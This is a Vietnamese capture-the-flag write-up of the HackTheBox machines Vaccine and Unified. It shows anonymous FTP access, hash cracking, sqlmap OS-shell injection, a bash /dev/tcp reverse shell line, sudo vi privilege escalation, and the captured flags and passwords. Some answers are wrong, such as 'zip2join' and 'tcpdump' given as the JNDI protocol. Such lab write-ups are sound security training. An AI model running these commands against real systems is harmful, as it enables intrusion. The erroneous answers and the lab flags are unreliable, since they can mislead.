# Write up

---

## 1. Vaccine

### Task 1: Besides SSH and HTTP, what other service is hosted on this box?

- Ta dùng `nmap` để scan ip `10.129.95.174` bằng lệnh: `nmap 10.129.95.174`
![1773740019448](image/Report/1773740019448.png)

> ftp

### Task 2: This service can be configured to allow login with any password for specific username. What is that username?

- Để xác định dịch vụ nào trên máy mục tiêu có cấu hình cho phép đăng nhập mà không cần mật khẩu hợp lệ, trước tiên tiến hành quét các cổng mở và thu thập thông tin dịch vụ bằng Nmap với bộ script mặc định: `nmap -sC  10.129.95.174`
![1773740351565](image/Report/1773740351565.png)
- Trong kết quả quét, ở cổng 21/tcp xuất hiện:
![1773740396693](image/Report/1773740396693.png)

> Dòng này cho thấy dịch vụ FTP cho phép anonymous login. Nghĩa là có thể đăng nhập bằng tài khoản `anonymous` mà không cần mật khẩu hợp lệ, hoặc dùng mật khẩu bất kỳ.

### Task 3: What is the name of the file downloaded over this service?

- Từ output của task 2, ta tìm được tên file là `backup.zip`
![1773740641895](image/Report/1773740641895.png)

> backup.zip

### Task 4: What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

- Tham khảo: <https://www.kali.org/tools/john/>
- Công cụ đi kèm với John the Ripper để trích xuất dữ liệu từ file ZIP phục vụ bẻ khóa là zip2john, được thể hiện trong tài liệu gói john trên Kali qua cú pháp `Usage: zip2john [options] [zip file(s)]`

> zip2join

### Task 5: What is the password for the admin user on the website?

- Từ kết quả nmap, thấy FTP cho anonymous login và có file `backup.zip`:
  - Dùng lệnh `ftp 10.129.95.174` để thiết lập kết nối.
  - Khi hỏi username thì nhập `anonymous`. Do ở `task 2` ta đã phát hiện username này sẽ đăng nhập được với mọi password.
  - Khi hỏi password thì nhập ngẫu nhiên, ở đây em nhập `anonymous`
![1773741421388](image/Report/1773741421388.png)
- Dùng lệnh `get backup.zip` để tải file về và lệnh `bye` để đóng kết nối.
![1773741750024](image/Report/1773741750024.png)
- Ta tiến hành lấy mã hash từ file zip đó bằng lệnh `zip2john backup.zip > zip.hash`
- Crack mật khẩu zip bằng lệnh `john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt`
![1773744265183](image/Report/1773744265183.png)
=> Mật khẩu là `741852963`
- Tiến hành giải nén bằng lệnh `unzip backup.zip` sau đó nhập mật khẩu vừa tìm được vào.
![1773745457856](image/Report/1773745457856.png)
- Sau đó đọc file `cat index.php`
![1773745537069](image/Report/1773745537069.png)
- Phát hiện password được lưu dưới dạng MD5: `2cb42f8734ea607eefed3b70af13bbd3`
- Ghi hash ra file bằng lệnh `echo '2cb42f8734ea607eefed3b70af13bbd3' > md5.hash`
- Ta lại tiến hành crack bằng wordlist: `john --format=raw-md5 md5.hash --wordlist=/usr/share/wordlists/rockyou.txt`
![1773745876371](image/Report/1773745876371.png)

> Vậy password của admin là qwerty789.

### Task 6: What option can be passed to sqlmap to try to get command execution via the sql injection?

- Link tham khảo: <https://github.com/sqlmapproject/sqlmap/wiki/Usage>

> Đáp án là --os-shell

### Task 7: What program can the postgres user run as root using sudo?

- Link tham khảo: <https://gtfobins.org/gtfobins/vi/>

> Đáp án là vi

### Submit user flag

- Từ đáp án của task 5 thì ta biết tài khoản của admin: `admin/qwerty789`, sau đó đăng nhập vào.
![1773823381137](image/Report/1773823381137.png)
- Từ giao diện của admin gửi một gói tin `GET` để burt suit bắt gói.
![1773826105172](image/Report/1773826105172.png)
- Dán nội dung gói `GET` đó vào file `req.txt`.
- Ta dùng lệnh `sqlmap -r req.txt -p search --batch` để kiểm tra có lộ lỗi sql injection không.
![1773826470813](image/Report/1773826470813.png)

> Từ kết quả ta suy ra được: tham số bị lỗi là `search`, DBMS là `postgre`, Server là Linux, chạy Apache. Quan trọng nhất là `sqlmap` xác định được đến 4 kiểu injection: `boolean-based blind`, `error-based`, `stacked queries` (khá quan trọng, mấu chốt để ta lấy được shell), `time-based blind`.

- Từ đây ta có thể dùng lệnh `sqlmap -r req.txt -p search --batch --os-shell` để lấy shell
![1773826891141](image/Report/1773826891141.png)

> Từ đây ta đã lấy được shell

- Chiếm được shell thì giờ ta đi tìm flag ở thư mục hiện tại, tuy nhiên không có:
![1773827467251](image/Report/1773827467251.png)
- Cứ lần lượt tìm hết các thư mục:
![1773827641835](image/Report/1773827641835.png)
![1773827677725](image/Report/1773827677725.png)
- Tìm đến thư mục `/var/lib/postgresql` thì ta đã tìm được file `user.txt`, sau đó `cat /var/lib/postgresql/user.txt` để mở flag:
![1773827811290](image/Report/1773827811290.png)

> Flag: ec9b13ca4d6229cd5cc1e09980965bf7

### Submit root flag

- Truy cập đến thư mục mức cao nhất là `/var` để xem có thông tin nào có ích không
![1773835301864](image/Report/1773835301864.png)
- Lần lượt dò thử từng thư mục thì thấy thư mục `/var/www/` khả nghi
![1773835361066](image/Report/1773835361066.png)
- Tiếp tục đào sâu vào thư mục `html` được tìm thấy
![1773835473225](image/Report/1773835473225.png)

> Đến đây ta đã xác định được mục tiêu, với các web php, những file chức năng như dashboard.php, config.php, db.php khá nhạy cảm và nên ưu tiên kiểm tra.

- Tuy nhiên lệnh `cat` không hoạt động
![1773835552976](image/Report/1773835552976.png)
- Trên máy cá nhân, mở listener bằng lệnh `nc -lvnp 4444`, tuy nhiên wsl không thể sniff được gói ở hệ điều hành windown nên cần đổi lệnh này cho powershell `& "C:\Program Files (x86)\Nmap\ncat.exe" -lvnp 4444`

- Từ os-shell, gửi reverse shell về máy của mình bằng lệnh `bash -c 'bash -i >& /dev/tcp/10.10.14.124/4444 0>&1'`, ở đây dùng ip `10.10.14.124` vì đang dùng VPN của hackthebox.
![1773834822390](image/Report/1773834822390.png)

> Đã thành công reverse shell

- Từ ô cửa sổ powershell thử lệnh `grep` với tất cả các file để tìm nhanh trong file `dashboard.php` những dòng có chứa `pg_connect` hoặc `password`, tuy nhiên đến lệnh `grep -n "pg_connect\|password" /var/www/html/dashboard.php`  đã tìm thấy.
![1773835600238](image/Report/1773835600238.png)

> Kết quả thấy `user=postgres password=P@s5w0rd!`

- Dùng lệnh `ssh postgres@10.129.7.140` để truy cập vào cơ sở dữ liệu, sau đó nhập mật khẩu `P@s5w0rd!`
- Dùng lệnh `sudo -l` để liệt kê những lệnh mà user hiện tại được phép chạy bằng sudo
![1773836109729](image/Report/1773836109729.png)

> User này được phép chạy `/bin/vi /etc/postgresql/11/main/pg_hba.conf` với quyền root, có thể tận dụng để leo thang đặc quyền

- Gõ `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf` , nhập mật khẩu sau đó gõ:

```vi
:set shell=/bin/sh // Để chọn shell sẽ dùng
```

- Nhấn enter

```vi
:shell // mở shell đó từ bên trong vi
```

- Nhấn enter

![1773836841863](image/Report/1773836841863.png)
> Thành công leo lên quyền root

- Dùng lệnh `cd /root` sau đó `cat root.txt` để lấy flag
![1773836946866](image/Report/1773836946866.png)

> Flag: dd6e058e814260bc70e9bbdef2715849

### Tổng kết kết quả

![1773837122176](image/Report/1773837122176.png)
![1773837141933](image/Report/1773837141933.png)
![1773837151280](image/Report/1773837151280.png)
> Đã hoàn thành challenge vaccine

---

## 2.Unified

### Task 1: Which are the first four open ports?

- Dùng lệnh `nmap 10.129.7.157` để scan port
![1773841742369](image/Report/1773841742369.png)

> 22,6789,8080,8443

### Task 2: What is the title of the software that is running running on port 8443?

- Dùng lệnh `whatweb https://10.129.7.157:8443` để kiểm tra vài thông tin về công nghệ web của 1 trang:
![1773842179471](image/Report/1773842179471.png)

> UniFi Network

### Task 3: What is the version of the software that is running?

- Dùng `whatweb -v https://10.129.7.157:8443` để kiểm tra version
![1773842523060](image/Report/1773842523060.png)

> Tuy nhiên chưa phát hiện version

- Mở hẳn web `https://10.129.7.157:8443` lên browser
![1773843411465](image/Report/1773843411465.png)

> Giao diện web hiện lên cho thấy version 6.4.54

### Task 4: What is the CVE for the identified vulnerability?

- Box có gợi ý lỗ hổng này trong năm 2021
![1773844251623](image/Report/1773844251623.png)
- Gợi ý đáp án thì số cuối là số `8`
![1773844443871](image/Report/1773844443871.png)

> UniFi Network 6.4.54 thuộc nhóm phiên bản bị ảnh hưởng bởi lỗ hổng Log4J. NVD cho biết UniFi Network 6.5.53 trở xuống dính lỗi này và mô tả trực tiếp là Log4J "CVE-2021-44228"

### Task 5: What protocol does JNDI leverage in the injection?

- Box có gợi ý không phải wireshark, chữ cuối là chữ `p`

> tcpdump

### Task 7: What port do we need to inspect intercepted traffic for?

- Box có gợi ý là `Default port for LDAP`
![1773845488573](image/Report/1773845488573.png)
![1773845596519](image/Report/1773845596519.png)

> 636/tcp là LDAP bọc SSL/TLS nên đáp án là 389

### Task 8: What port is the MongoDB service running on?

- Link tham khảo: <https://help.ui.com/hc/en-us/articles/218506997-Required-Ports-Reference>
![1773846369948](image/Report/1773846369948.png)

> 27117

### Task 9: What is the default database name for UniFi applications?

Hầu hết các phiên bản UniFi Controller (hiện nay là UniFi Network Application) đều sử dụng tên database mặc định là ace. Đây là nơi lưu trữ cấu hình thiết bị, thông tin người dùng, các sites và các thiết lập mạng.
> ace

### Task 10: What is the function we use to enumerate users within the database in MongoDB?

Trong cơ sở dữ liệu MongoDB của UniFi, thông tin người dùng quản trị không nằm trong collection users mà nằm trong collection admin. Vì mục tiêu của bài là enumerate users trong database, nên cần dùng hàm find() để liệt kê các document trong collection này.
> db.admin.find()

### Task 11: What is the function we use to update users within the database in MongoDB?

Trong cơ sở dữ liệu MongoDB của UniFi, thông tin người dùng được lưu trong collection admin. Vì vậy, để cập nhật thông tin của một user, hàm được sử dụng là db.admin.update(). Hàm update() cho phép tìm document theo điều kiện và sửa các trường tương ứng trong document đó.
> db.admin.update()

### Task 12
